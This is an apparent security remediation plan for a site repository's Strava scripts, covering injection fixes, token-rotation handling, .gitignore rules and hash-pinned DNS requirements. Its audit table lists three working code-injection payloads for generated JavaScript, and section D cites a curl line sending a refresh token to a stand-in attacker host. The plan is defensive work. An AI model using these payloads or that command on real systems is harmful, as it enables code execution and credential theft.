# Plan 031: The two script seams validate what they accept, and no comment there states a false reason

> **Executor instructions**: Follow this plan step by step. Run every verification command and
> confirm the expected result before moving to the next step. If anything in the "STOP conditions"
> section occurs, stop and report — do not improvise. Update this plan's status row in
> `plans/README.md` when you are done; the rest of that file is the reviewer's.
>
> **Drift check (run first)**:
> `git diff --stat 847d4a7..HEAD -- scripts/scaffold-race.mjs scripts/strava-auth.mjs tests/strava-scripts.test.ts .gitignore dns/requirements.txt`
> If any of those changed, compare the excerpts under "Current state" against the live code before
> proceeding. On a mismatch, treat it as a STOP condition.

## Status

- **Priority**: P2
- **Effort**: M
- **Risk**: LOW (input validation that fails loudly, one ignore rule, one requirements pin; nothing under `src/`)
- **Depends on**: — **disjoint from every other plan in this set.** It shares no file with 029, 030, 032, 033 or 034, so it may be executed in parallel with any of them.
- **Category**: security
- **Planned at**: commit `847d4a7`, 2026-08-19
- **Finding**: security audit run 1 finding 2, and run 1 notes 6, 7, 8, 12 and 14.

## Why this matters

`scripts/scaffold-race.mjs` writes a TypeScript module into `src/data/races/`, and
`src/data/races/index.ts` loads that directory with `import.meta.glob(..., {eager: true})` — so the
generated module **executes at every build**. Three fields from a Strava API response reach that
generated source. One of them, the activity title, is escaped by a `commentSafe` helper whose
docstring states the threat model and demonstrates the breakout in place. **The other two are
copied unchecked.** `metres` is emitted unquoted, so a string value becomes an expression; `id` is
emitted inside an unescaped double-quoted literal and again raw into a JSDoc block.

Reaching those fields requires controlling the body of an HTTPS response from `www.strava.com` — a
platform compromise, not an account one — which is why the audit rated it LOW and why you should
not treat this as urgent. Treat it as *inconsistent*: every other API-derived field in the same file
is validated, the defence was designed correctly, and it was applied to one field of three.

The rest of this plan is the same shape at the credential seam: a rotation that can be dropped
silently, a comment justifying an argv exposure with a reason that is false, a credential
destination that nothing pins, an ignore list that misses the filenames the framework's own
convention produces, and a requirements file that calls itself "Pinned exactly" while leaving its
whole transitive tree to whatever PyPI serves that minute.

## Current state

### A — the two unvalidated fields

`scripts/scaffold-race.mjs:163-166`:

```js
export function recordingsFrom(activities) {
    return orderedByStart(activities)
        .map((a) => ({ id: String(a.id), metres: a.distance, elapsed_time: hms(a.elapsed_time) }));
}
```

`:234-237`, where they reach generated source:

```js
export function renderModule({ date, sport, elapsed_time, recordings, titles, argv }) {
    const rows = recordings
        .map((r) => `{id: "${r.id}", metres: ${r.metres}, elapsed_time: "${r.elapsed_time}"}`);
    const evidence = titles.map(({ id, title }) => ` *   ${id}  ${commentSafe(title)}`).join("\n");
```

`metres` is unquoted. `id` sits inside a double-quoted literal with no escaping, and appears again
raw beside a `commentSafe(title)` in the JSDoc.

**Payloads, executed against this repository's own script during the audit** — reproduce them in
step 1:

| Field | Value | Result |
|---|---|---|
| `distance` | `"(globalThis.PWNED = 1, 17908.4)"` | emitted verbatim as `metres: (globalThis.PWNED = 1, 17908.4)`; executes on import, and `metres === 17908.4` so `tests/data-contract.test.ts` still passes |
| `id` | `1", metres: (globalThis.P=1, 5), z: "` | breaks out of the row string literal; executes on import |
| `id` | `1*/ globalThis.P3=1; /*` | closes the generated JSDoc block; executes on import |

A fourth payload, `], EVIL, [`, does **not** work — it contains no quote character. It was published
in an audit draft and corrected. Do not use it as a test case; it would pass against unfixed code.

Every other API-derived field here is already validated: `start_date_local` by a regex
(`calendarDate`, `:73`), `sport_type` by a fixed map, `elapsed_time` by `hms` (`:98`), `name` by
`slugify` and `commentSafe` (`:196`).

**What bounds this today**, and why it stays LOW: `grep -rn "scripts/" .github/workflows/` returns
one line, and it is `node scripts/fetch-strava-progress.mjs`. Neither `scaffold-race.mjs` nor
`strava-sync.mjs` is reachable from CI at all — they are operator tools. The scaffold also omits the
required `name` and `country` fields by design, so the generated module cannot type-check until a
human opens and edits it.

**Existing coverage you must not break.** `tests/strava-scripts.test.ts:345` asserts the scaffold
"copies `metres` verbatim rather than converting it", and `:393` asserts it "cannot be made to write
executable code out of an activity title". The comment above `recordingsFrom` argues at length that
`metres` is the API's `distance` **copied, not converted**, because `kmFromMetres` in
`src/lib/race.ts` owns the conversion and has been reset three times. `Number()` applied to a number
is the identity, so a finiteness guard preserves that property — but you must confirm it rather than
assume it, and the guard must **throw** on a non-number rather than coerce one.

### B — a rotation that can be dropped in silence

`scripts/strava-auth.mjs:172-177`:

```js
    // The response carries a refresh token on every call and it is USUALLY the same one.
    // Comparing rather than assuming is the whole difference between this and the inline
    // refresh it replaced, which destructured `access_token` alone and could not have
    // noticed a rotation at all.
    if (typeof body.refresh_token === "string" && body.refresh_token !== refreshToken) {
        persistRotation(env, body.refresh_token);
    }
```

This fails **closed** on writing and **open** on returning success. A response that omits
`refresh_token`, or returns it as a number or an object, drops a real rotation with nothing printed
and nothing thrown: both stores keep a token Strava has already spent. A missing `access_token` is
already an error four lines above; this deserves the same treatment. The adjacent comment's first
sentence is also an unverified assumption about a third party's behaviour.

### C — a false reason beside a credential

`scripts/strava-auth.mjs:113-115`:

```
    // The value goes in argv here because `op item edit` takes its assignments that way and
    // has no stdin form. It is briefly visible to `ps` on the local machine — accepted, and
    // named rather than hidden. The GitHub half below does have a stdin form and uses it.
```

**Verified false against the installed op 2.39.0.** `op item edit --help` documents a JSON template
(`--template=<path>`), says in its own words "For sensitive values, use a template instead", carries
a "Caution: Command arguments can be visible to other processes on your machine" note, and
explicitly documents piped input: `cat updatedLogin.json | op item edit oldLogin`.

**The decision, taken by the maintainer, is to keep argv and rewrite the reason** — do not change the
mechanism. The tradeoff that justifies argv is real and is what the comment should say: a template
edit is a whole-item read-modify-write, and the help states JSON templates do not support passkeys
and will overwrite one. Clobbering an item is a worse failure than a same-user `ps` read of a
refresh token that cannot be redeemed without `STRAVA_CLIENT_SECRET`, which never enters argv.

### D — an unpinned credential destination

`scripts/strava-auth.mjs:107` and `scripts/strava-sync.mjs:68` both read `STRAVA_SECRET_REPO`, and
it is the `-R` argument of `gh secret set STRAVA_REFRESH_TOKEN`. It lives in `.env.op`, which is
committed by design and whose own header frames its contents as "REFERENCES, NOT VALUES" and
addresses rather than credentials. `STRAVA_SECRET_REPO` is not an address of a thing to read — it is
the **destination of a credential write**.

This is not a finding: `gh secret set` needs the account to hold admin on the target, and anyone who
can land that edit can land `curl attacker/$STRAVA_REFRESH_TOKEN` instead. Asserting it costs three
lines.

### E — the `.gitignore` env gap

`.gitignore:26-29` lists three exact names with no wildcard, deliberately — `.env.op` is committed
and its header argues against `.env*` in as many words.

**Re-measured with `git check-ignore` at `847d4a7`:**

| ignored | not ignored |
|---|---|
| `.env`, `.env.local`, `.env.production` | `.env.production.local`, `.env.development`, `.env.development.local`, `.env.test`, `.env.test.local` |

Astro and Vite load `.env.[mode]` and `.env.[mode].local`, so the framework's own convention
produces exactly the five filenames the list misses. No such file exists today.

### F — `dns/requirements.txt`

```
# Pinned exactly, not floated, because the safety argument in `config.yaml` is an argument
# about these versions' behaviour. `test_filters.py` re-proves that behaviour on whatever is
# installed, so a bump that breaks it goes red here rather than in the zone.
octodns==1.21.1
octodns-cloudflare==1.2.0
```

Two pins, no `--require-hashes`, no transitive pins. The resolved tree — `requests`, `urllib3`,
`certifi`, `PyYAML`, `dnspython`, `natsort`, `python-dateutil`, `idna` — is whatever PyPI serves
that minute, and `pip install -r` runs in `dns.yml`'s `apply` job, which holds
`CLOUDFLARE_DNS_WRITE_TOKEN`. That is the one place in this repository where unpinned third-party
code shares a process with a write credential to the domain's DNS — in a repository that SHA-pins
every action for exactly that threat.

### Conventions that apply

- Scripts here fail loudly and say what to do next; read the surrounding error messages in
  `strava-auth.mjs` before writing one.
- Comments argue rather than assert. A comment that states a reason must state a true one — the
  whole of section C exists because a false reason survived every review that trusted it.
- `pnpm eslint` globs `src/**/*.{js,astro}` and `scripts/**/*.mjs`, so the scripts arm is linted.
- Prose is gated: `tests/docs-drift.test.ts` reaches `.md`, `.yml`, `.json` and `.ts`.
- Never commit to `main`; every change gets its own branch in its own worktree.
- A fresh worktree has no `node_modules` — symlink the main checkout's.

## Commands you will need

| Purpose | Command | Expected on success |
|---|---|---|
| Install | `pnpm install` | exit 0 |
| Typecheck | `pnpm check` | exit 0, `0 errors` |
| Lint | `pnpm eslint` | exit 0, no output |
| Tests (builds first) | `pnpm test` | exit 0, all files pass |
| Just this suite | `SKIP_BUILD=1 pnpm vitest run tests/strava-scripts.test.ts` | all pass |
| Check an ignore rule | `git check-ignore -q .env.test && echo IGNORED` | prints `IGNORED` after step 5 |

## Scope

**In scope**:

- `scripts/scaffold-race.mjs` — `recordingsFrom` only
- `scripts/strava-auth.mjs` — the `refresh_token` check and the comment at `:113-115`
- `tests/strava-scripts.test.ts` — new assertions
- `.gitignore` — the environment block
- `dns/requirements.txt` — hashes
- `plans/README.md` — this plan's status row only
- this file

**Out of scope**:

- `renderModule`'s string building. Fix the input, not the template. Validating at the source closes
  all three sinks at once and keeps the generated shape reviewable; escaping at three emit sites is
  the version that rots when a fourth is added.
- `commentSafe` — it is correct. This plan extends the defence it demonstrates; it does not touch it.
- The **mechanism** of the `op` write. The maintainer decided: argv stays, the reason changes.
  Changing it is a live-1Password operation no test here can gate.
- `.env.op`'s contents, and the decision to commit it. Both are deliberate and argued in the file.
- `src/lib/race.ts` and `kmFromMetres`. The conversion is not this plan's business.
- Anything under `src/`.

## Git workflow

- Branch: short and descriptive, in its own worktree under `.claude/worktrees/`.
- Conventional Commits, lowercase imperative subject; the body carries *why* and *what was verified*.
- Squash-merge. The pull request title becomes the commit subject.
- Do not push or open a pull request unless the operator instructed it.

## Steps

### Step 1 (A): prove all three sinks before closing them

Write three failing tests in `tests/strava-scripts.test.ts`, beside the existing
`"cannot be made to write executable code out of an activity title"` (`:393`) — that test is your
structural pattern; follow its shape.

Feed `recordingsFrom` an activity carrying each payload from the table under "Current state A", pass
the result to `renderModule`, and assert the rendered module does **not** contain the injected text.
All three must **fail** against unfixed code.

**Verify**: `SKIP_BUILD=1 pnpm vitest run tests/strava-scripts.test.ts` → three failures, each
naming its payload. If any passes, you have written the assertion wrongly — a test that is green
before the fix proves nothing.

### Step 2 (A): validate at the source

In `recordingsFrom`, convert and check before building the row:

- `metres`: `Number(a.distance)`, then **throw** unless `Number.isFinite` and it is not negative.
- `id`: `String(a.id)`, then **throw** unless it matches `/^\d+$/`.

Both messages should name the activity and the offending value, in the loud style the rest of the
file uses.

Carry a comment saying why the guard does not violate the "copied, not converted" doctrine the
function's own docblock argues: `Number()` on a number is the identity, so the stored value is still
the API's `distance` and `kmFromMetres` still owns the conversion. Say also that the guard throws
rather than coerces, because a coerced value is a silently wrong race.

**Verify**:
- The three tests from step 1 now pass.
- `SKIP_BUILD=1 pnpm vitest run tests/strava-scripts.test.ts` → **all** pass, including `:345`
  ("copies `metres` verbatim") and `:243`/`:261`. If `:345` broke, your guard converts rather than
  validates — STOP and re-read its assertion.

### Step 3 (B): make a dropped rotation an error

Change the `refresh_token` handling so a response whose `refresh_token` is absent or not a string
**throws**, matching the treatment `access_token` already gets four lines above. A rotation that
happened and was not persisted must not return success.

Correct the comment in the same edit: its first sentence asserts a third party's behaviour as fact.
State what is observed and what the code does when the observation fails.

**Verify**: add a test beside `:214` ("treats a 200 with no access_token as a failure") — that is
your pattern — asserting a 200 with no `refresh_token` also fails. Confirm it reddens against the
old code.

### Step 4 (C): rewrite the false reason

Replace the "has no stdin form" justification with the true tradeoff described under "Current state
C". The comment must not claim a stdin form does not exist, and must say what argv buys instead: no
read-modify-write of the whole item, and therefore no risk of clobbering fields the template does
not carry.

**Verify**: `grep -n 'has no stdin form' scripts/strava-auth.mjs` → no match. `pnpm eslint` clean.

### Step 5 (D and E): pin the destination and close the ignore gap

- Assert in `tests/strava-scripts.test.ts` that `STRAVA_SECRET_REPO` resolves to
  `calvindotsg/portfolio-v2` on the paths that write a credential. Read it the way the scripts read
  it, so the assertion tracks the code rather than the file format.
- Rewrite the `.gitignore` environment block as `.env*` with `!.env.op` and `!.env.example` — and
  keep the reasoning `.env.op`'s header gives, rewritten to explain why the negation now carries it.
  Read that header first; it argues explicitly against `.env*` and you are overriding that argument,
  so the new comment must answer it rather than ignore it.

**Verify**:
```bash
for f in .env .env.local .env.production .env.production.local .env.development \
         .env.development.local .env.test .env.test.local; do
  git check-ignore -q "$f" && echo "IGNORED   $f" || echo "NOT       $f"
done
git check-ignore -q .env.op && echo "BUG: .env.op is ignored" || echo "OK: .env.op still tracked"
git status --porcelain   # must be empty of .env.op
```
Expect all eight ignored and `.env.op` **not** ignored.

### Step 6 (F): hash-pin the DNS requirements

Regenerate `dns/requirements.txt` with hashes for the full transitive tree:

```bash
uv pip compile --generate-hashes dns/requirements.in -o dns/requirements.txt
```

If no `.in` file exists, create one holding the two direct pins that are in the file today and
compile from it — the two-file split is what makes the next bump a one-line edit rather than a
hand-edited hash list. Then make `dns.yml`'s install use `--require-hashes` (pip infers it when
hashes are present, but stating it is what makes a hash-less line fail loudly rather than silently).

Update the file's own comment: "Pinned exactly" becomes true of the whole tree rather than of two
lines, and it should say which file is the source and which is generated.

**Verify**: the DNS workflow's install step succeeds. `dns/test_filters.py` needs Python and octoDNS
and runs only in `.github/workflows/dns.yml`, so **you cannot verify this locally with `pnpm test`**
— say so in the pull request body and let the `dns` workflow's `plan` job be the check.

### Step 7: full ladder

```bash
pnpm check && pnpm eslint && pnpm test
```

## Test plan

New assertions, all in `tests/strava-scripts.test.ts` — no new test file:

- Three injection cases from the table (step 1), modelled on `:393`.
- A 200 response with no `refresh_token` fails (step 3), modelled on `:214`.
- `STRAVA_SECRET_REPO` resolves to this repository on the credential-write paths (step 5).

The `.gitignore` change is verified by `git check-ignore` rather than by a test — it is git
configuration, not code, and shelling out to `git` from the suite would test git.

Every one of the four new assertions must be shown **red against unfixed code** before it is green.
Record the failure output in the pull request body.

Verification: `pnpm test` → all files pass. Do not write an absolute suite total anywhere.

## Done criteria

Machine-checkable. ALL must hold:

- [ ] `pnpm check`, `pnpm eslint`, `pnpm test` all exit 0
- [ ] The three injection payloads produce a thrown error, not a rendered module
- [ ] `tests/strava-scripts.test.ts:345`'s "copies `metres` verbatim" assertion still passes
- [ ] `grep -n 'has no stdin form' scripts/strava-auth.mjs` → no match
- [ ] All eight `.env*` filenames are ignored and `.env.op` is not
- [ ] `dns/requirements.txt` carries a hash for every resolved package
- [ ] Every new assertion was shown red before green
- [ ] No file outside the in-scope list is modified (`git status`)
- [ ] This plan's row in `plans/README.md` is updated

## STOP conditions

Stop and report back — do not improvise — if:

- Adding the `metres` guard reddens `tests/strava-scripts.test.ts:345`. That assertion defends a
  deliberate doctrine reset three times; if a finiteness check breaks it, your guard is converting.
- Any real race module under `src/data/races/` fails the new `^\d+$` rule for an existing `id`. That
  would mean the rule is wrong about Strava's id format, not that the data is wrong. Report the id.
- The `.env*` rewrite makes `.env.op` untracked (`git status` shows it deleted or ignored). The
  negation is wrong; do not commit.
- `uv` is unavailable and you cannot generate hashes. Report it — do **not** hand-write a hash list,
  and do not skip step 6 silently.
- You cannot make one of the four new assertions fail against unfixed code.

## Maintenance notes

- **`recordingsFrom` is the single validation point for everything the scaffold copies from the
  API.** A fourth field added to that map needs its guard here, not at the emit site — the whole
  argument for fixing the input is that `renderModule` gains sinks faster than anyone re-audits it.
- A reviewer should scrutinise that the `metres` guard **throws** rather than coerces, and that the
  `op` comment now states a tradeoff rather than a capability claim about another tool's CLI.
- `dns/requirements.txt` is now generated. The next Dependabot bump touches the `.in` file and the
  lock is recompiled — a hand-edited hash line is the failure mode to watch for in review.
- **Deferred deliberately**: validating `elapsed_time`'s shape beyond `hms`'s finiteness check, and
  auditing the Strava OAuth grants. Neither reaches generated source, so neither belongs in this
  plan's argument.
